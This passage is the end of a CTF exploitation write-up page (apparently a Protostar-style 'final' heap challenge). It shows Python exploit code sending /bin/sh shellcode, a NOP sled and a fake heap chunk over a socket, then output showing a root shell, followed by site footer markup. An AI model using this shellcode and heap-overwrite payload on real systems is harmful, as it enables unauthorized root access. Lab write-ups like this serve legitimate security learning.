+<span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s2">&quot;</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="s1">&#39;/ROOT&#39;</span> <span class="o">+</span> <span class="s1">&#39;/&#39;</span> <span class="o">*</span> <span class="mh">0xf</span> <span class="o">+</span> <span class="n">jmp</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mh">0xa</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s1">&#39;/&#39;</span> <span class="o">*</span> <span class="mh">0x80</span><span class="p">))</span>
+<span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="mh">0xfffffffc</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="mh">0x804d41c</span> <span class="o">-</span> <span class="mh">0xc</span><span class="p">)</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="mh">0x804e020</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="s1">&#39;ROOT/&#39;</span> <span class="o">+</span>  <span class="n">fake_chunk</span><span class="p">))</span>
+
+<span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
+<span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
+<span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>$ python final.py 
+
+Process OK
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+whoami
+root
+<span class="nb">exit</span>
+*** Connection closed by remote host ***
+</code></pre></div>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      最后更新:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">December 8, 2022 11:02:00</span>
+      
+    
+  </small>
+</div>
+
+              
+
+  
+    <div class="md-source-date">
+      <small>
+          <span class="twemoji">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M5.5 3.5a2 2 0 1 0 0 4 2 2 0 0 0 0-4zM2 5.5a3.5 3.5 0 1 1 5.898 2.549 5.507 5.507 0 0 1 3.034 4.084.75.75 0 1 1-1.482.235 4.001 4.001 0 0 0-7.9 0 .75.75 0 0 1-1.482-.236A5.507 5.507 0 0 1 3.102 8.05 3.49 3.49 0 0 1 2 5.5zM11 4a.75.75 0 1 0 0 1.5 1.5 1.5 0 0 1 .666 2.844.75.75 0 0 0-.416.672v.352a.75.75 0 0 0 .574.73c1.2.289 2.162 1.2 2.522 2.372a.75.75 0 1 0 1.434-.44 5.01 5.01 0 0 0-2.56-3.012A3 3 0 0 0 11 4z"/></svg> 
+          </span>
+          Contributors: <span class='git-page-authors git-authors'><a href='mailto:137126578@qq.com'>YanhuiJessica</a></span>
+      </small>
+      <br>
+      <small>
+          <span id="busuanzi_container_page_pv">
+            <span class="twemoji">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0 8a5 5 0 0 1-5-5 5 5 0 0 1 5-5 5 5 0 0 1 5 5 5 5 0 0 1-5 5m0-12.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5Z"/></svg>
+            </span>
+            Pageviews: <span id="busuanzi_value_page_pv"></span>
+          </span>
+      </small>
+    </div>
+  
+  
+  <!-- Giscus -->
+  <h2 id="__comments">评论</h2>
+  <script src="https://giscus.app/client.js"
+      data-repo="YanhuiJessica/Chictf-Writeups"
+      data-repo-id="MDEwOlJlcG9zaXRvcnkyNDg1MTU1OTc="
+      data-category="General"
+      data-category-id="DIC_kwDODtAMDc4CP_N3"
+      data-mapping="title"
+      data-reactions-enabled="1"
+      data-emit-metadata="0"
+      data-input-position="top"
+      data-theme="light"
+      data-lang="zh-CN"
+      data-loading="lazy"
+      crossorigin="anonymous"
+      async>
+  </script>
+
+  <!-- Synchronize Giscus theme with palette -->
+  <script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    /* Set palette on initial load */
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+      var theme = palette.color.scheme === "slate" ? "dark" : "light"
+      giscus.setAttribute("data-theme", theme)
+    }
+
+    /* Register event handlers after documented loaded */
+    document.addEventListener("DOMContentLoaded", function() {
+      var ref = document.querySelector("[data-md-component=palette]")
+      ref.addEventListener("change", function() {
+        var palette = __md_get("__palette")
+        if (palette && typeof palette.color === "object") {
+          var theme = palette.color.scheme === "slate" ? "dark" : "light"
+
+          /* Instruct Giscus to change theme */
+          var frame = document.querySelector(".giscus-frame")
+          frame.contentWindow.postMessage(
+            { giscus: { setConfig: { theme } } },
+            "https://giscus.app"
+          )
+        }
+      })
+    })
+  </script>
+
+            </article>
+            
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="页脚" >
+      
+        
+        <a href="../net/" class="md-footer__link md-footer__link--prev" aria-label="上一页: Net" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              Net
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../../eggs/ctfhub_index/" class="md-footer__link md-footer__link--next" aria-label="下一页: CTFHub - 首页" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              CTFHub - 首页
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2020 - 2022 YanhuiJessica
+    </div>
+  
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/YanhuiJessica" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.1.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share"], "search": "../../../assets/javascripts/workers/search.b028fd86.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f758a944.min.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      
+    
+  </body>
+</html>
